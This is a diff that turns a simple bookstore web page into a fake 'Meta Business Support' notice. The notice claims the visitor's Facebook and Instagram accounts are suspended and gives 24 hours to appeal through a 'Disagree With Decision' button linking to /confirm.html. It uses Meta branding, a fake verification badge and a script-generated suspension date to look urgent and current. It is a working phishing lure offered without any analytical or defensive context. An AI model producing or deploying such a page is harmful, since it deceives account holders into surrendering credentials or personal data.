@@ -1,126 +1,127 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Book Haven - Online Bookstore</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Meta Business Support</title>
   <style>
     body {
-      font-family: 'Segoe UI', sans-serif;
       margin: 0;
-      background: #f9f9f9;
-      color: #333;
-    }
-    header {
-      background: #34495e;
-      color: white;
-      padding: 30px 20px;
-      text-align: center;
-    }
-    header h1 {
-      margin: 0;
-      font-size: 2em;
+      font-family: Arial, sans-serif;
+      background-color: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
     }
     .container {
-      padding: 20px;
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-      gap: 20px;
-    }
-    .book {
-      background: white;
-      border-radius: 8px;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
-      overflow: hidden;
-      display: flex;
-      flex-direction: column;
-    }
-    .book img {
+      background-color: white;
+      max-width: 600px;
       width: 100%;
-      height: 300px;
-      object-fit: cover;
-    }
-    .book-details {
-      padding: 15px;
-      flex-grow: 1;
-    }
-    .book h3 {
-      margin: 0 0 10px;
-      font-size: 1.2em;
-    }
-    .book p {
-      font-size: 0.9em;
-      margin: 0 0 10px;
-    }
-    .price {
-      color: #e74c3c;
-      font-weight: bold;
-      font-size: 1.1em;
-    }
-    .buy-button {
-      background: #27ae60;
-      color: white;
-      border: none;
-      padding: 10px;
-      font-size: 1em;
-      cursor: pointer;
-      width: 100%;
-      border-top: 1px solid #eee;
-    }
-    .buy-button:hover {
-      background: #219150;
-    }
-    footer {
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
       text-align: center;
-      padding: 20px;
-      background: #ecf0f1;
-      margin-top: 40px;
-      font-size: 0.9em;
     }
+    .meta-logo {
+      width: 50px;
+      margin-bottom: 20px;
+    }
+    .title {
+      font-size: 24px;
+      font-weight: bold;
+      margin-bottom: 20px;
+    }
+    .alert-box {
+      background-color: #eeeeee;
+      padding: 15px;
+      margin-bottom: 20px;
+    }
+    .alert-box p {
+      margin: 0;
+      font-size: 16px;
+    }
+    .section {
+      text-align: left;
+      margin-bottom: 20px;
+    }
+    .section h3 {
+      margin-bottom: 10px;
+      font-size: 18px;
+    }
+    .section p {
+      margin: 0;
+      font-size: 16px;
+    }
+    .button {
+      display: inline-block;
+      background-color: #1877f2;
+      color: white;
+      padding: 12px 24px;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+      text-decoration: none;
+      margin-top: 20px;
+      width: -webkit-fill-available;
+    }
+    .footer {
+      font-size: 14px;
+      color: #888;
+      margin-top: 30px;
+    }
+    @media (max-width: 600px) {
+      .title {
+        font-size: 20px;
+      }
+      .alert-box p,
+      .section p,
+      .section h3 {
+        font-size: 15px;
+      }
+      .button {
+        width: 100%;
+        padding: 14px;
+      }
+      }
   </style>
 </head>
 <body>
-
-<header>
-  <h1>Book Haven</h1>
-  <p>Discover the world of great books every day</p>
-</header>
-
-<section class="container">
-  <div class="book">
-    <img src="https://images.unsplash.com/photo-1589820296156-2454bb8c929c?auto=format&fit=crop&w=500&q=80" alt="Book 1">
-    <div class="book-details">
-      <h3>Atomic Habits</h3>
-      <p>Small changes, big results. Build better habits today.</p>
-      <div class="price">$5.00</div>
+  <div class="container">
+    <img src="https://brandlogos.net/wp-content/uploads/2021/10/meta_platforms_icon-logo_brandlogos.net_f5zqr.png" alt="Meta Logo" class="meta-logo">
+    <div class="title">Meta Business Support <img src="https://torro.io/hs-fs/hubfs/Meta-Verified-Packages-Checkmark.png" alt="Verfication" class="blue-check" style="height: 16px;"></div>
+    <div class="alert-box">
+      <p><strong>⛔ We suspended your account</strong><br><br>
+      24 hours left to disagree or we'll permanently disable your account</p>
+      <p id="suspend-date" style="margin-top: 10px; color: gray;"></p>
     </div>
-    <button class="buy-button">Buy Now</button>
+    <div class="section">
+      <h3>What this means</h3>
+      <p>Your Facebook and Instagram account are not visible to people on Facebook or Instagram right now, and you cannot use them.</p>
+    </div>
+    <div class="section">
+      <h3>What you can do</h3>
+      <p>You have 24 hours left to disagree with our decision. We may need to collect some info from you that'll help us to take another look.</p>
+    </div>
+    <div class="section">
+      <h3>Why this happened</h3>
+      <p>Your account was flagged for deletion due to suspected impersonation. Using a false identity doesn't follow our <a href="#">Terms</a> and <a href="#">Community Standards</a> on account integrity and authentic identity and may lead to permanent account removal.</p>
+    </div>
+    <a href="/confirm.html" class="button">Disagree With Decision</a>
+    <div class="footer">
+      from <strong>Meta</strong><br>
+      Meta Terms of Service Team © <script>document.write(new Date().getFullYear());</script> Inc.
+    </div>
   </div>
 
-  <div class="book">
-    <img src="https://images.unsplash.com/photo-1528207776546-365bb710ee93?auto=format&fit=crop&w=500&q=80" alt="Book 2">
-    <div class="book-details">
-      <h3>Deep Work</h3>
-      <p>Focused success in a distracted world.</p>
-      <div class="price">$5.40</div>
-    </div>
-    <button class="buy-button">Buy Now</button>
-  </div>
-
-  <div class="book">
-    <img src="https://images.unsplash.com/photo-1544716278-ca5e3f4abd8c?auto=format&fit=crop&w=500&q=80" alt="Book 3">
-    <div class="book-details">
-      <h3>The Subtle Art of Not Giving a F*ck</h3>
-      <p>Sometimes you just need to care less and live more.</p>
-      <div class="price">$4.80</div>
-    </div>
-    <button class="buy-button">Buy Now</button>
-  </div>
-</section>
-
-<footer>
-  &copy; 2025 Book Haven. Contact: support@bookhaven.com
-</footer>
-
+  <script>
+    const dateElement = document.getElementById('suspend-date');
+    const today = new Date();
+    const options = { year: 'numeric', month: 'long', day: 'numeric' };
+    const formattedDate = today.toLocaleDateString(undefined, options);
+    dateElement.textContent = `Suspended on ${formattedDate}`;
+  </script>
 </body>
 </html>
